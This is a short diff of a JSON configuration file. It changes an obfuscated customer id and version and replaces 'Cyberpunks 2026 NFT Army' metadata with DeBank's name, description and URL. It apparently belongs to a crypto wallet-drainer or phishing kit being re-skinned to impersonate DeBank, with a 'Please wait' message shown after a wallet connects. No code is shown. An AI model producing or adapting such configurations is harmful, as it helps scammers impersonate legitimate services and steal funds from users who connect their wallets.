@@ -1,6 +1,6 @@
 {
-  "customer_id": "2b33363531313031313732",
-  "version": "v7.2.6",
+  "customer_id": "2b373636353433343233353f3331",
+  "version": "v7.3.1",
   "button_text_contents": {
     "after_connecting": "Please wait"
   },
@@ -26,8 +26,8 @@
   },
   "projectId": "",
   "metadata": {
-    "name": "Cyberpunks 2026 NFT Army",
-    "description": "Join the Cyberpunks 2026 NFT Army revolution!",
+    "name": "Debank",
+    "description": "The Real User Based Web3 Community",
     "url": "https://debank.com/",
     "icons": [
       "https://avatars.githubusercontent.com/u/35694601"
